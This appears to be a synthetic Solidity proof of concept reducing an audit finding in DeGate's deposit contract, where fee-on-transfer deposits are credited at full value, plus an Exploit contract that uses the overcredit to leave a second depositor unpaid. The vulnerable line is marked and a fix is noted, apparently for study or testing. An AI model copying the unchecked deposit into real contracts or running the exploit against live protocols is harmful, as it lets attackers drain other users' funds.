// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  DeGate — arbitrary token deposit skips the balance check (Trail of Bits, 17856)
    SYNTHETIC, cheatcode-free reduction.
    Root cause: any user can register a token, and needCheckBalance defaults to
    false. A 10% fee-on-transfer deposit is credited for the full amount.
    Alice then withdraws that credit and Bob cannot. Vulnerable line preserved (@> VULN). */

contract FeeToken {
    string public name = "Fee Token";
    string public symbol = "FEE";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    uint256 public constant FEE_BPS = 1000;
    address public constant DEAD = address(0x000000000000000000000000000000000000dEaD);
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external {
        balanceOf[to] += a;
        totalSupply += a;
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        _move(msg.sender, to, a, false);
        return true;
    }

    function transferFrom(address from, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[from][msg.sender];
        if (al != type(uint256).max) allowance[from][msg.sender] = al - a;
        _move(from, to, a, true);
        return true;
    }

    function _move(address from, address to, uint256 a, bool takeFee) internal {
        require(balanceOf[from] >= a, "bal");
        balanceOf[from] -= a;
        if (!takeFee) {
            balanceOf[to] += a;
            return;
        }
        uint256 fee = a * FEE_BPS / 10_000;
        balanceOf[DEAD] += fee;
        balanceOf[to] += a - fee;
    }
}

contract DefaultDepositContract {
    address public owner;
    mapping(address => bool) public registered;
    mapping(address => bool) public needCheckBalance;
    mapping(address => mapping(address => uint96)) public credits;
    uint32 public nextId;

    constructor(address _owner) { owner = _owner; }

    function registerToken(address tokenAddress) public returns (uint32 tokenID) {
        require(!registered[tokenAddress], "dup");
        registered[tokenAddress] = true;
        tokenID = ++nextId;
    }

    function setCheckBalance(address token, bool checkBalance) external {
        require(msg.sender == owner, "owner");
        require(needCheckBalance[token] != checkBalance, "INVALID_VALUE");
        needCheckBalance[token] = checkBalance;
    }

    function deposit(address from, address token, uint96 amount) external returns (uint96 amountReceived) {
        if (!registered[token]) {
            registerToken(token); // permissionless, including via a first deposit
        }
        bool checkBalance = needCheckBalance[token]; // STORY2
        uint256 balanceBefore = checkBalance ? FeeToken(token).balanceOf(address(this)) : 0;
        FeeToken(token).transferFrom(from, address(this), uint256(amount)); // STORY3
        uint256 balanceAfter = checkBalance ? FeeToken(token).balanceOf(address(this)) : amount; // @> VULN: credits `amount` when the fee token delivered less
        // FIX: always set balanceAfter = FeeToken(token).balanceOf(address(this))
        uint256 diff = balanceAfter - balanceBefore;
        amountReceived = uint96(diff);
        credits[from][token] += amountReceived; // STORY5
    }

    function withdraw(address token, uint96 amount) external {
        credits[msg.sender][token] -= amount;
        require(FeeToken(token).transfer(msg.sender, amount), "pay");
    }
}

contract Bob {
    function deposit(DefaultDepositContract exchange, FeeToken token, uint96 amount) external {
        token.approve(address(exchange), amount);
        exchange.deposit(address(this), address(token), amount);
    }

    function withdraw(DefaultDepositContract exchange, FeeToken token, uint96 amount) external {
        exchange.withdraw(address(token), amount);
    }
}

contract Exploit {
    FeeToken public token; // nonce 1
    DefaultDepositContract public exchange; // nonce 2
    Bob public bob; // nonce 3
    bool public bobPaid;
    uint96 public constant CHUNK = 1000 ether;

    constructor() {
        token = new FeeToken();
        exchange = new DefaultDepositContract(address(0xB0B));
        bob = new Bob();
        token.mint(address(bob), CHUNK);
        token.mint(address(this), CHUNK);
        bob.deposit(exchange, token, CHUNK); // Bob is over-credited before run()
    }

    function run() external {
        token.approve(address(exchange), CHUNK);
        uint96 credited = exchange.deposit(address(this), address(token), CHUNK); // STORY1
        require(credited == CHUNK, "overcredit");
        require(needActual() == (CHUNK * 90) / 100, "received");
        exchange.withdraw(address(token), CHUNK); // STORY4
        try bob.withdraw(exchange, token, CHUNK) {
            bobPaid = true;
        } catch {
            bobPaid = false;
        }
        require(!bobPaid, "bob was paid"); // STORY6
        require(token.balanceOf(address(exchange)) == 800 ether, "short");
        require(exchange.credits(address(bob), address(token)) == CHUNK, "bob credit");
        require(token.balanceOf(address(this)) == CHUNK, "alice even");
    }

    function needActual() public view returns (uint256) {
        return (uint256(CHUNK) * 90) / 100;
    }
}
